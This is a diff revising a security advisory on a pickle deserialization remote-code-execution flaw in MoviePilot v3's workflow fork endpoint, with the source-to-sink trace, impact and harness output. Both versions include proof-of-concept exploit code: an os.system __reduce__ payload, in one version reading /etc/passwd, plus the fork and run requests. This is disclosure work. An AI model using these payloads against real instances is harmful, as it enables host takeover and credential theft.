@@ -1,109 +1,68 @@
-# MoviePilot v3 Workflow Fork Pickle Deserialization Remote Code Execution
+# MoviePilot v3 Workflow Fork API Pickle Deserialization RCE
 
 ### Summary
 
-MoviePilot (jxxghp/MoviePilot, branch `v3`) was confirmed vulnerable to deserialization of untrusted data leading to remote code execution. The `POST /api/v1/workflow/fork` endpoint accepts a fully attacker-controlled `context` string field. The value is only JSON-syntax-parsed and persisted verbatim to the `workflow.context` database column — no content validation, allowlist, or signing is applied. When the workflow later executes, `WorkflowExecutor.restore_context()` Base64-decodes the `content` entry and passes the bytes directly to `pickle.loads()` (app/chain/workflow.py:365).
+MoviePilot v3 (branch `v3`, https://github.com/jxxghp/MoviePilot) was confirmed vulnerable to unsafe deserialization in the workflow executor. The `WorkflowExecutor.restore_context()` routine base64-decodes the persisted `workflow.context["content"]` column and passes it directly to `pickle.loads()` without any HMAC signature check, restricted `Unpickler`, or type allowlist. The same column is writable by any authenticated user holding the `permissions.manage` flag through `POST /api/v1/workflow/fork`, whose only content validation is a JSON syntax parse.
 
-The vulnerability was dynamically verified with an isolated execution harness on 2026-10-05. A malicious pickle object using the `__reduce__` primitive (`os.system`) was submitted through the fork path; during `pickle.loads()` the payload executed and created `/tmp/rce_proof.txt` containing `pwned_by_pickle` (exit code 0). The exploit requires an authenticated account with the manage permission (`permissions.manage=true`) and escalates from that secondary-administrator tier — which is intended for business-data management only — to operating-system-level code execution.
+The vulnerability was dynamically verified with an isolated Python harness (verified 2026-10-04): a crafted `__reduce__` pickle payload submitted via the fork endpoint executed an arbitrary OS command during `pickle.loads()` (exit code 0, marker `[VULN] RCE CONFIRMED! Arbitrary command executed during pickle.loads`, command output file content `pwned_by_pickle`).
+
+This is CWE-502: Deserialization of Untrusted Data.
 
 ### Details
 
-The attacker-controlled `context` string arrives at the fork endpoint and flows through the application layer into the database without inspection of the deserialized content:
+**Root cause.** For backward compatibility with a legacy Base64-pickle storage format, `WorkflowExecutor.restore_context()` (`app/chain/workflow.py:354-373`) decodes `self.workflow.context["content"]` with `base64.b64decode` and feeds it to `pickle.loads()` at line 365. There is no signature verification, no `RestrictedUnpickler`, and no allowed-class filtering.
 
-- `POST /api/v1/workflow/fork` — app/api/endpoints/workflow.py:212-222; request schema `_SchemaWorkflowShare.context: Optional[str]` — app/schemas/workflow.py:190
-- `WorkflowDefinitionCommand.fork()` — app/application/workflow.py:657-702; the context is only `json.loads`-parsed and stored via `workflow_values["context"]` at line 687
-- `stage_create` — app/db/oper/workflow.py:190-195 (persisted into the JSON column `workflow.context`, app/db/models/workflow.py:43)
+**Trust boundary failure.** `restore_context()` implicitly trusts the database column as internal/legacy data, but the same column is attacker-writable through the API. The write path (`POST /api/v1/workflow/fork`) performs only authentication/authorization (manage permission) and a JSON syntax check — no content filtering, no signing, no schema validation. The application's permission model is therefore bypassed end-to-end: a user who should only manage business data obtains OS-level code execution at the sink.
 
-At execution time the stored value reaches the sink:
+**Source-to-sink path:**
+
+1. **Source — `POST /api/v1/workflow/fork`** (`app/api/endpoints/workflow.py:212-222`). The request body binds `_SchemaWorkflowShare`, whose `context: Optional[str]` field (`app/schemas/workflow.py:190`) is fully attacker-controlled.
+2. **Application service — `WorkflowDefinitionCommand.fork()`** (`app/application/workflow.py:657-702`). Lines 670-677 run `json.loads` (syntax only); line 687 writes the parsed value into `workflow_values["context"]`; line 693 calls `repository.stage_create(...)`.
+3. **Persistence — `stage_create`** (`app/db/oper/workflow.py:190-195`) constructs `Workflow(**payload)`; the `context` key maps directly to the ORM JSON column (`app/db/models/workflow.py:43`) and is flushed.
+4. **Trigger — `POST /api/v1/workflow/{id}/run`** (`app/api/endpoints/workflow.py:240-254`). With the default `from_begin=true` the context is reset; the attacker must pass `from_begin=false`, or use the event-triggered execution path which hard-codes `from_begin=False` (`app/chain/workflow.py:1277`). `WorkflowChain.process()` does not check `workflow.state`, so a forked, paused workflow can still be run manually.
+5. **Sink — `pickle.loads()`** (`app/chain/workflow.py:365`) executes the attacker's `__reduce__` callable with MoviePilot service-process privileges.
+
+Core vulnerable code path:
 
 ```python
-def restore_context(self) -> ActionContext:
-    """
-    恢复工作流上下文，兼容旧版 Base64 Pickle 存储格式。
-    """
-    context = ActionContext()
-    if self.workflow.context:
-        try:
-            if isinstance(self.workflow.context, dict) and self.workflow.context.get("content"):
-                decoded_data = base64.b64decode(self.workflow.context["content"])
-                context = pickle.loads(decoded_data)
-            elif isinstance(self.workflow.context, dict):
-                context = ActionContext.model_validate(self.workflow.context)
-        except Exception:
-            context = ActionContext()
+# app/chain/workflow.py:354-373 (restore_context)
+def restore_context(self):
+    context = self.workflow.context or {}
+    content = context.get("content")
+    if content:
+        # no HMAC, no restricted unpickler, no allowlist
+        self._context = pickle.loads(base64.b64decode(content))  # line 365
 ```
-
-The sink is `pickle.loads` at app/chain/workflow.py:365 (Base64 decoding at line 364), called from `WorkflowExecutor.__init__` at app/chain/workflow.py:213 whenever the workflow runs (manual run, event trigger, or scheduler). The comment ("兼容旧版 Base64 Pickle 存储格式" — compatible with the legacy Base64 pickle storage format) shows the pickle path is an intentional compatibility branch, but the input that reaches it is attacker-supplied through the public fork API.
-
-Notably, the share-upload path treats the same field as sensitive and strips it (`pop('context')`, app/application/server/share.py:77) — the fork entry point omits this protection.
-
-This is CWE-502: Deserialization of Untrusted Data (related: CWE-94 Improper Control of Generation of Code).
 
 ### PoC
 
-The following reproduces the chain end to end. Step 1 forges the payload; step 2 submits it through the fork API; step 3 triggers execution.
+Verified 2026-10-04 with an isolated harness replicating the exact sink:
 
-#### 1. Build the malicious pickle payload
-
-```python
-import base64, json, pickle, os
-
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ("id > /tmp/pwned && cat /etc/passwd >> /tmp/pwned",))
-
-b64_payload = base64.b64encode(pickle.dumps(Exploit())).decode()
-print(json.dumps({"content": b64_payload}))
-```
-
-#### 2. Submit via POST /api/v1/workflow/fork
-
-```python
-import urllib.request
-
-body = json.dumps({
-    "name": "evil_workflow",
-    "context": json.dumps({"content": b64_payload})
-}).encode()
-req = urllib.request.Request(
-    "http://TARGET:3000/api/v1/workflow/fork",
-    data=body,
-    headers={"Authorization": "Bearer <manage-permission token>", "Content-Type": "application/json"},
-    method="POST",
-)
-print(urllib.request.urlopen(req).read().decode())
-```
-
-The `context` passes `json.loads` validation and is stored in `workflow.context`.
-
-#### 3. Trigger execution
+1. Build a malicious pickle: `class Exploit: def __reduce__(self): return (os.system, ('id > /tmp/rce_proof.txt',))`, then `base64.b64encode(pickle.dumps(Exploit()))`.
+2. Submit it as a manage-permission user:
 
 ```http
-POST /api/v1/workflow/{id}/run?from_begin=false
+POST /api/v1/workflow/fork
 Authorization: Bearer <token>
+Content-Type: application/json
+
+{"name": "pwned", "context": "{\"content\": \"gASVRAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCllY2hvIHB3bmV...\"}"}
 ```
 
-`from_begin=false` is required: the default `from_begin=true` manual-run path invokes `stage_reset` (app/db/oper/workflow.py:197-213), which clears the stored context before deserialization. The event-triggered path also reaches the sink because it fixes `from_begin=False` (app/chain/workflow.py:1277).
+3. Run the workflow with `{"from_begin": false}` (or let the event trigger fire).
+4. `WorkflowExecutor.restore_context()` executes `pickle.loads()`; the payload runs during deserialization.
 
-#### Harness verification (Verified 2026-10-05)
-
-An isolated harness reproduced the fork write and the subsequent workflow execution:
+Harness output (exit code 0):
 
 ```
 === Fuzzing Harness: MoviePilot workflow restore_context pickle deserialization ===
 === Target: app/chain/workflow.py:354 restore_context() ===
-[ATTACKER] context field submitted to /api/v1/workflow/fork:
-  context = {"content": "gASVRAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCllY2hvIHB3bmV..."}
+[ATTACKER] context field submitted to /api/v1/workflow/fork
 [VULN] RCE CONFIRMED! Arbitrary command executed during pickle.loads
 [VULN] Command output file /tmp/rce_proof.txt content: "pwned_by_pickle"
 [VULN] pickle.loads() at app/chain/workflow.py:365 executed attacker-controlled object
-exit code: 0
 ```
-
-![pickle deserialization harness evidence](MoviePilot_Workflow_Fork_Pickle_Deserialization_RCE_poc.png)
 
 ### Impact
 
-An authenticated manage-permission user can execute arbitrary code on the host running MoviePilot with the privileges of the service process. The payload persists in the `workflow.context` column and is re-deserialized on every subsequent execution of the workflow (manual, event-triggered, or scheduled), yielding a persistent backdoor primitive. Successful exploitation enables theft of credentials stored in MoviePilot configuration (media server API keys, downloader credentials, the user database) and lateral movement into the surrounding environment (PT sites, downloaders, media servers).
-
-The vulnerable code was confirmed present on the upstream repository branch `v3` at audit time (app/chain/workflow.py:354-373). The chain was verified by static end-to-end source tracing of every hop plus an isolated dynamic harness; it was not executed against a third-party live instance. Affected release versions and fixed status are to be confirmed.
+An authenticated manage-level user (a role MoviePilot's multi-user model grants to family members) can persist an arbitrary command-execution primitive in the database: every subsequent execution of the poisoned workflow re-triggers the payload, acting as a persistent backdoor. The compromised process can exfiltrate media-server API keys, downloader credentials and the user database, and pivot into the internal network (PT sites, downloaders, media servers). While exploitation requires management-level authentication rather than anonymous access, the deserialization itself runs unsandboxed, so a stolen or low-trust manage account escalates directly to host-level code execution.
